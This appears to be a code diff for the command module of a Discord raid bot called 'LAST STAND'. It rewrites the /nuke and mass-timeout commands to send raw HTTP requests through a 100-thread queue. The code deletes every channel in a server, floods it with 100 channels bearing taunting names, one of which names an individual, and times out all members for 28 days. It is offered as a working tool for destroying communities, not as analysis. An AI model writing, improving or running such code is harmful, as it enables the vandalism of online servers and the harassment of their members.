@@ -1,19 +1,26 @@
 """
 control.py — LAST STAND | /stop, /status, /nuke, /timeoutall, /setratelimit, /bypassstats
-All commands have slash (/) and prefix (.) versions.
-Raw direct discord.py calls — no bypass engine in hot paths.
+Nuke uses 100-thread raw HTTP queue for channel delete + rebuild (c-realV2.py port).
 """
 
 import asyncio
 import datetime
+import random
 
 import discord
+import requests
 from discord import app_commands
 from discord.ext import commands
 
+from utils.http_queue import HttpQueue, API_BASE
 from utils.state import bot_state
 
 RAID_TAG = "LAST STAND"
+
+_CH_NAMES = [
+    "raided-by-ls", "last-stand-owned", "ls-raid", "jean-lorenzo-raided",
+    "ls-was-here", "obliterated-by-ls", "ls-breach", "server-pwned",
+]
 
 
 class Control(commands.Cog):
@@ -38,6 +45,7 @@ class Control(commands.Cog):
             return "No operation is currently running."
         name  = bot_state.active_simulation or "unknown"
         count = len(bot_state.running_tasks)
+        HttpQueue.get().clear()
         bot_state.stop_all()
         return (
             f"🛑 **Stopped — {RAID_TAG}**\n"
@@ -67,7 +75,7 @@ class Control(commands.Cog):
         return f"📊 **Idle** — {RAID_TAG}\n┗ Active tasks: `{len(bot_state.running_tasks)}`"
 
     # ── /setratelimit + .setratelimit ──────────────────────────────────────────
-    @app_commands.command(name="setratelimit", description="Change intensity live (1–10). Cosmetic only — bot now runs raw.")
+    @app_commands.command(name="setratelimit", description="Change intensity live (1–10).")
     @app_commands.describe(level="1–10")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
@@ -84,7 +92,7 @@ class Control(commands.Cog):
         if not 1 <= level <= 10:
             return "❌ Level must be 1–10."
         bot_state.rate_controller.set_intensity(level)
-        return f"⚙️ Intensity set to `{level}/10` (bot runs raw — no artificial delays)."
+        return f"⚙️ Intensity set to `{level}/10`."
 
     # ── /bypassstats + .bypassstats ────────────────────────────────────────────
     @app_commands.command(name="bypassstats", description="Show task and operation stats.")
@@ -105,11 +113,12 @@ class Control(commands.Cog):
             f"```\n"
             f"Operation    : {bot_state.active_simulation or 'idle'}\n"
             f"Active tasks : {len(bot_state.running_tasks)}\n"
+            f"Engine       : 100-thread raw HTTP queue\n"
             f"```"
         )
 
     # ── /nuke + .nuke ──────────────────────────────────────────────────────────
-    @app_commands.command(name="nuke", description="☢️ Delete every channel instantly, optionally rebuild with flood channels.")
+    @app_commands.command(name="nuke", description="☢️ Delete every channel instantly via 100-thread queue, optionally rebuild.")
     @app_commands.describe(rebuild="Create 100 flood channels after nuking. Default True.")
     @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
@@ -125,6 +134,7 @@ class Control(commands.Cog):
         await interaction.response.send_message(
             f"☢️ **NUKE — {RAID_TAG}**\n"
             f"┣ Deleting : `{len(channels)}` channels\n"
+            f"┣ Engine   : `100-thread raw HTTP queue`\n"
             f"┗ Rebuild  : `{'✅ 100 flood channels' if rebuild else '❌'}`"
         )
 
@@ -142,6 +152,7 @@ class Control(commands.Cog):
         await ctx.send(
             f"☢️ **NUKE — {RAID_TAG}**\n"
             f"┣ Deleting : `{len(channels)}` channels\n"
+            f"┣ Engine   : `100-thread raw HTTP queue`\n"
             f"┗ Rebuild  : `{'✅ 100 flood channels' if do_rebuild else '❌'}`"
         )
 
@@ -151,44 +162,34 @@ class Control(commands.Cog):
         bot_state.add_task(asyncio.create_task(self._run_nuke(guild, channels, rebuild)))
 
     async def _run_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
-        se  = bot_state.stop_event
-        sem = asyncio.Semaphore(40)
-
-        async def _del(ch):
-            async with sem:
-                try:
-                    await ch.delete()
-                except discord.NotFound:
-                    pass
-                except discord.HTTPException as e:
-                    if e.status == 429:
-                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                        try:
-                            await ch.delete()
-                        except Exception:
-                            pass
-                except Exception:
-                    pass
+        se = bot_state.stop_event
+        q  = HttpQueue.get()
 
         try:
-            await asyncio.gather(*[_del(ch) for ch in channels], return_exceptions=True)
+            # ── delete all channels simultaneously via queue ───────────────
+            for ch in channels:
+                q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
+            await q.join()
 
             if rebuild and not se.is_set():
-                await asyncio.sleep(1.0)
+                await asyncio.sleep(1.5)
+
+                # ── rebuild 100 flood channels via queue ───────────────────
                 for i in range(100):
                     if se.is_set():
                         break
-                    try:
-                        await guild.create_text_channel(f"raided-by-lsc-{i:03d}")
-                    except discord.HTTPException as e:
-                        if e.status == 429:
-                            await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                    except Exception:
-                        pass
-                    await asyncio.sleep(0.55)
+                    name = f"{random.choice(_CH_NAMES)}-{i:03d}"
+                    q.put(
+                        requests.post,
+                        f"{API_BASE}/guilds/{guild.id}/channels",
+                        {"name": name, "type": 0},
+                    )
+
+                if not se.is_set():
+                    await q.join()
 
         except asyncio.CancelledError:
-            pass
+            q.clear()
         except Exception as e:
             print(f"[nuke] crashed: {e}", flush=True)
         finally:
@@ -243,29 +244,33 @@ class Control(commands.Cog):
             f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
             f"┣ Targets  : `{len(targets)}`\n"
             f"┣ Duration : `28 days`\n"
+            f"┣ Engine   : `100-thread raw HTTP queue`\n"
             f"┗ `/stop` or `.stop` halts immediately."
         )
 
-        bot_state.add_task(asyncio.create_task(self._do_timeout(targets)))
+        bot_state.add_task(asyncio.create_task(self._do_timeout(guild, targets)))
 
-    async def _do_timeout(self, members: list[discord.Member]) -> None:
-        se  = bot_state.stop_event
-        sem = asyncio.Semaphore(25)
-        dur = datetime.timedelta(days=28)
+    async def _do_timeout(self, guild: discord.Guild, members: list[discord.Member]) -> None:
+        q  = HttpQueue.get()
+        se = bot_state.stop_event
 
-        async def _one(m):
-            async with sem:
-                if se.is_set():
-                    return
-                try:
-                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
-                except Exception:
-                    pass
+        timeout_until = (
+            datetime.datetime.utcnow() + datetime.timedelta(days=28)
+        ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
 
         try:
-            await asyncio.gather(*[_one(m) for m in members], return_exceptions=True)
+            for m in members:
+                if se.is_set():
+                    break
+                q.put(
+                    requests.patch,
+                    f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
+                    {"communication_disabled_until": timeout_until},
+                )
+            if not se.is_set():
+                await q.join()
         except asyncio.CancelledError:
-            pass
+            q.clear()
         finally:
             if bot_state.active_simulation == "timeoutall":
                 bot_state.active_simulation = None
